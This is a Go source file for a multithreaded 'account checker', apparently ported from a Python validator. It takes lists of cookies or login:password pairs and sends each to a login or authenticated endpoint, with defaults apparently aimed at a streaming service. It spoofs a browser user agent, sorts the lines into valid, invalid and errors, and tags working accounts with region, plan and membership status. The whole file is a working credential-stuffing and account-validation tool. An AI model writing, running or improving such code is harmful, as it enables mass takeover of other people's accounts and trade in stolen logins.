package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"
)

// ───────────────── account checker (ported from checker/validator.py) ─────────────────
// Proves a cookie/creds line by replaying the SAME authenticated endpoint the
// app uses. Config-driven — mirror of validator.py's config.json fields.

const (
	bucketValid   = "valid"
	bucketInvalid = "invalid"
	bucketErrors  = "errors"
)

type CheckProfile struct {
	Endpoint      string   `json:"endpoint"`
	LoginEndpoint string   `json:"login_endpoint,omitempty"`
	LoginField    string   `json:"login_field"`
	PassField     string   `json:"pass_field"`
	BuildID       string   `json:"build_id,omitempty"`
	APIKey        string   `json:"api_key,omitempty"`
	UA            string   `json:"ua,omitempty"`
	Referer       string   `json:"referer,omitempty"`
	Origin        string   `json:"origin,omitempty"`
	TimeoutSec    int      `json:"timeout,omitempty"`
	Probes        []string `json:"logged_in_probes,omitempty"`
	RegionPath    string   `json:"region_path,omitempty"`
	PlanPath      string   `json:"plan_path,omitempty"`
	StatusPath    string   `json:"status_path,omitempty"`
	Threads       int      `json:"threads,omitempty"`
}

type checkResult struct {
	bucket string // valid | invalid | errors
	out    string // full output line (tagged on valid)
}

func (p *CheckProfile) timeout() time.Duration {
	t := p.TimeoutSec
	if t <= 0 {
		t = 15
	}
	return time.Duration(t) * time.Second
}

func (p *CheckProfile) threads() int {
	if p.Threads <= 0 {
		return 30
	}
	return p.Threads
}

// newCheckClient matches validator.py allow_redirects=False — a 302 to a login
// page is a DEAD account signal, following it would turn invalid into valid.
func newCheckClient(timeout time.Duration) *http.Client {
	return &http.Client{
		Timeout: timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

func truthy(v interface{}) bool {
	switch t := v.(type) {
	case nil:
		return false
	case bool:
		return t
	case string:
		return t != ""
	case float64:
		return t != 0
	case json.Number:
		return t.String() != "0" && t.String() != ""
	default:
		return true // maps/slices: presence counts as logged-in evidence
	}
}

// dig walks a dot-path ("model.summary.userCountry") through decoded JSON.
func dig(data interface{}, path string) interface{} {
	if path == "" {
		return nil
	}
	cur := data
	for _, key := range strings.Split(path, ".") {
		m, ok := cur.(map[string]interface{})
		if !ok {
			return nil
		}
		cur, ok = m[key]
		if !ok {
			return nil
		}
	}
	return cur
}

func (p *CheckProfile) headers(cookie string) map[string]string {
	ua := p.UA
	if ua == "" {
		ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
	}
	ref := p.Referer
	if ref == "" {
		ref = "https://www.example.net/"
	}
	h := map[string]string{
		"User-Agent": ua,
		"Accept":     "application/json, text/plain, */*",
		"Referer":    ref,
	}
	if p.BuildID != "" {
		h["X-Netflix-BuildId"] = p.BuildID
	}
	if p.APIKey != "" {
		h["X-API-Key"] = p.APIKey
	}
	if cookie != "" {
		h["Cookie"] = cookie
	}
	return h
}

// loginForCookie exchanges creds for a session cookie via the login endpoint.
// Returns just the name=value pair — validator.py kept "sid=...; Path=/" raw,
// which is an invalid Cookie header; here attributes are stripped.
func (p *CheckProfile) loginForCookie(client *http.Client, creds string) (string, bool) {
	if p.LoginEndpoint == "" {
		return "", false
	}
	// Cut returns (before, after, found) — before=login, after=password
	login, pass, _ := strings.Cut(creds, ":")
	lf := p.LoginField
	if lf == "" {
		lf = "login"
	}
	pf := p.PassField
	if pf == "" {
		pf = "password"
	}
	body, _ := json.Marshal(map[string]string{lf: login, pf: pass})
	req, err := http.NewRequest("POST", p.LoginEndpoint, bytes.NewReader(body))
	if err != nil {
		return "", false
	}
	for k, v := range p.headers("") {
		req.Header.Set(k, v)
	}
	req.Header.Set("Content-Type", "application/json")
	if p.Origin != "" {
		req.Header.Set("Origin", p.Origin)
	}
	r, err := client.Do(req)
	if err != nil {
		return "", false
	}
	defer r.Body.Close()
	if r.StatusCode != 200 && r.StatusCode != 201 {
		return "", false
	}
	setc := r.Header.Get("Set-Cookie")
	if setc == "" {
		return "", false
	}
	// first cookie's name=value only (strip "; Path=/ HttpOnly ..." attributes)
	cookie := strings.SplitN(setc, ",", 2)[0]
	return strings.TrimSpace(strings.SplitN(cookie, ";", 2)[0]), true
}

// checkOne mirrors validator.py check_one: replay the authenticated endpoint,
// classify by status code, then probe the JSON body for logged-in evidence.
func (p *CheckProfile) checkOne(client *http.Client, item string) checkResult {
	cookie := item
	loginMode := p.LoginEndpoint != ""
	if loginMode {
		c, ok := p.loginForCookie(client, item)
		if !ok {
			return checkResult{bucketInvalid, item}
		}
		cookie = c
	}

	req, err := http.NewRequest("GET", p.Endpoint, nil)
	if err != nil {
		return checkResult{bucketErrors, item}
	}
	for k, v := range p.headers(cookie) {
		req.Header.Set(k, v)
	}
	r, err := client.Do(req)
	if err != nil {
		return checkResult{bucketErrors, item}
	}
	defer r.Body.Close()

	switch {
	case r.StatusCode >= 300 && r.StatusCode < 400:
		return checkResult{bucketInvalid, item}
	case r.StatusCode == 401 || r.StatusCode == 403:
		return checkResult{bucketInvalid, item}
	case r.StatusCode != 200:
		return checkResult{bucketInvalid, item}
	}

	var data interface{}
	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
		return checkResult{bucketInvalid, item} // 200 + non-JSON (HTML login wall)
	}

	// logged-in probe: any configured path present & truthy proves auth
	if len(p.Probes) > 0 {
		authed := false
		for _, pr := range p.Probes {
			if truthy(dig(data, pr)) {
				authed = true
				break
			}
		}
		if !authed {
			return checkResult{bucketInvalid, item}
		}
	}

	rp := p.RegionPath
	if rp == "" {
		rp = "model.summary.userCountry"
	}
	pp := p.PlanPath
	if pp == "" {
		pp = "model.summary.subPlan"
	}
	sp := p.StatusPath
	if sp == "" {
		sp = "model.summary.membershipStatus"
	}
	region := fmt.Sprint(firstNonNil(dig(data, rp), "UNKNOWN"))
	plan := fmt.Sprint(firstNonNil(dig(data, pp), "UNKNOWN"))
	status := fmt.Sprint(firstNonNil(dig(data, sp), "OK"))

	return checkResult{bucketValid, fmt.Sprintf("%s | region=%s plan=%s status=%s", item, region, plan, status)}
}

func firstNonNil(v interface{}, fallback string) interface{} {
	if s, ok := v.(string); ok && s == "" {
		return fallback
	}
	if v == nil {
		return fallback
	}
	return v
}

// checkChunk checks all lines concurrently (worker pool, ordered results) —
// mirrors validator.py ThreadPoolExecutor with per-line index mapping.
func checkChunk(data string, prof *CheckProfile) (results []checkResult, valid, invalid, errs int) {
	var lines []string
	for _, l := range strings.Split(data, "\n") {
		l = strings.TrimRight(l, "\r")
		if strings.TrimSpace(l) != "" {
			lines = append(lines, l)
		}
	}
	results = make([]checkResult, len(lines))
	client := newCheckClient(prof.timeout())

	sem := make(chan struct{}, prof.threads())
	var wg sync.WaitGroup
	for i := range lines {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			results[i] = prof.checkOne(client, lines[i])
		}(i)
	}
	wg.Wait()

	for _, res := range results {
		switch res.bucket {
		case bucketValid:
			valid++
		case bucketErrors:
			errs++
		default:
			invalid++
		}
	}
	return
}
